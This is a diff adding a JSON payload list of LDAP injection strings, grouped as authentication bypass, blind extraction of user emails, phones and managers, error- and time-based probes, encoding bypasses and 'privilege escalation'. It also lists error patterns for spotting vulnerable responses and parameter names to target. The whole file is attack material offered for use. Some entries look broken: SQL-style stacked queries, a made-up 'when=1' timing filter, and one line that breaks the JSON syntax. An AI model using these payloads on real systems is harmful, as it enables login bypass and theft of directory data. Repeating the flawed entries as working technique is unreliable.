@@ -1,0 +1,93 @@
+{
+  "info": {
+    "name": "LDAP Injection Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Comprehensive LDAP injection payloads for authentication bypass, blind extraction, and privilege escalation. 2026 updated.",
+    "category": "Injection",
+    "severity": "CRITICAL",
+    "owasp": "A03:2021 - Injection"
+  },
+  "payloads": {
+    "auth_bypass": [
+      {"payload": "admin)(&)", "description": "Admin auth bypass basic", "encoding": "none", "target": "username"},
+      {"payload": "admin)(&)(password=*)", "description": "Admin auth bypass with password wildcard", "encoding": "none", "target": "username"},
+      {"payload": ")(uid=*))(|(uid=*", "description": "UID extraction bypass", "encoding": "none", "target": "username"},
+      {"payload": "*)(uid=*))(|(uid=*", "description": "Wildcard all users", "encoding": "none", "target": "username"},
+      {"payload": "administrator)(&(password=*)", "description": "Administrator bypass", "encoding": "none", "target": "username"},
+      {"payload": "root)(&(objectClass=*)", "description": "Root access attempt", "encoding": "none", "target": "username"},
+      {"payload": "')(uid=*))(|(uid=*", "description": "Quote prefix auth bypass", "encoding": "none", "target": "username"},
+      {"payload": "*)(|(uid=*", "description": "Wildcard with OR", "encoding": "none", "target": "username"},
+      {"payload": "admin)(&(password=*", "description": "Admin with password check", "encoding": "none", "target": "username"},
+      {"payload": ")(objectClass=*)", "description": "ObjectClass injection", "encoding": "none", "target": "username"}
+    ],
+    "blind_extraction": [
+      {"payload": "*)(uid=*", "description": "Blind extract all UIDs", "encoding": "none", "target": "username"},
+      {"payload": "*)(objectClass=Users", "description": "Extract user objects", "encoding": "none", "target": "username"},
+      {"payload": "admin*)(|(objectClass=People", "description": "Extract people objects", "encoding": "none", "target": "username"},
+      {"payload": "*)(member=*)", "description": "Extract all members", "encoding": "none", "target": "username"},
+      {"payload": ")(mail=*", "description": "Extract all emails", "encoding": "none", "target": "username"},
+      {"payload": "*)(telephoneNumber=*)", "description": "Extract phone numbers", "encoding": "none", "target": "username"},
+      {"payload": ")(cn=*", "description": "Extract common names", "encoding": "none", "target": "username"},
+      {"payload": "*)(title=*)", "description": "Extract job titles", "encoding": "none", "target": "username"},
+      {"payload": ")(department=*", "description": "Extract departments", "encoding": "none", "target": "username"},
+      {"payload": "*)(manager=*)", "description": "Extract managers", "encoding": "none", "target": "username"}
+    ],
+    "error_based": [
+      {"payload": "%2a%28uid%3d%2a%29%28%7c%28uid%3d%2a", "description": "URL encoded error trigger", "encoding": "url", "target": "username"},
+      {"payload": "*()|%28&", "description": "Syntax error trigger", "encoding": "none", "target": "username"},
+      {"payload": "admin%5C00*", "description": "Null byte injection", "encoding": "url", "target": "username"},
+      {"payload": "admin*)(&(password=*)", "description": "And-based error", "encoding": "none", "target": "username"},
+      {"payload": "*)(uid=*))(|(uid=test", "description": "Nested OR error trigger", "encoding": "none", "target": "username"}
+    ],
+    "time_based": [
+      {"payload": "admin)(when=1)(when=1)(|(uid=*", "description": "Time delay basic", "encoding": "none", "target": "username"},
+      {"payload": "*)(uid=*)(&(objectClass=Users", "description": "Time-based extraction", "encoding": "none", "target": "username"},
+      {"payload": ")(memberOf=*)(&(objectClass=*", "description": "Group membership delay", "encoding": "none", "target": "username"}
+    ],
+    "encoding_bypass": [
+      {"payload": "admin%00)(&", "description": "Null byte bypass", "encoding": "url", "target": "username"},
+      {"payload": "admin%0a)(&", "description": "Newline bypass", "encoding": "url", "target": "username"},
+      {"payload": "admin%0d%0a)(&", "description": "CRLF bypass", "encoding": "url", "target": "username"},
+      {"payload": "%61%64%6d%69%6e)(&", "description": "Hex encoded admin", "encoding": "hex", "target": "username"},
+      {"payload": "adm\\u0069n)(&", "description": "Unicode bypass", "encoding": "unicode", "target": "username"},
+      {"payload": "admin\\x00)(&", "description": "Hex null byte", "encoding": "escaped", "target": "username"},
+      {"payload": "/*comment*/)(uid=*", "description": "Comment injection", "encoding": "none", "target": "username"},
+      {"payload": "admin"+ "(", "description": "String concatenation", "encoding": "none", "target": "username"}
+    ],
+    "privilege_escalation": [
+      {"payload": "superadmin)(&(objectClass=*)", "description": "Superadmin escalation", "encoding": "none", "target": "username"},
+      {"payload": "domain\\admin)(&(objectClass=*)", "description": "Domain admin escalation", "encoding": "none", "target": "username"},
+      {"payload": "enterprise\\admin)(&(objectClass=*)", "description": "Enterprise admin escalation", "encoding": "none", "target": "username"},
+      {"payload": "Schema.*)(objectClass=*", "description": "Schema admin access", "encoding": "none", "target": "username"},
+      {"payload": "Builtin\\Administrators)(&(objectClass=*)", "description": "Builtin admin escalation", "encoding": "none", "target": "username"}
+    ],
+    "ldap_search_filter_injection": [
+      {"payload": "*)(cn=*", "description": "Search all common names", "encoding": "none", "target": "search"},
+      {"payload": "admin*)(objectClass=*)", "description": "Search admin objects", "encoding": "none", "target": "search"},
+      {"payload": "(&(objectClass=*)(cn=*", "description": "Combined filter injection", "encoding": "none", "target": "search"},
+      {"payload": "(|(cn=*)(objectClass=*))", "description": "OR filter injection", "encoding": "none", "target": "search"}
+    ],
+    "ldap_stacked_queries": [
+      {"payload": "admin); memberOf=CN=Admins,CN=Builtin,DC=domain,DC=com--", "description": "Group membership add", "encoding": "none", "target": "username"},
+      {"payload": "admin)(memberOf=CN=Admins,CN=Builtin,DC=domain,DC=com--", "description": "Admin group add", "encoding": "none", "target": "username"}
+    ]
+  },
+  "detection_patterns": [
+    "ldap.*error",
+    "Invalid.*filter",
+    "LDAP.*exception",
+    "javax\.naming\.NamingException",
+    "com\.sun\.jndi\.ldap",
+    "ldap server is unavailable",
+    "timed out",
+    "InvalidCredentialsException",
+    "size limit exceeded",
+    "no such object"
+  ],
+  "parameters": [
+    "username", "user", "login", "name", "filter", "search", "query",
+    "dn", "base", "binddn", "manager", "owner", "member", "group",
+    "email", "account", "uid", "objectClass"
+  ]
+}
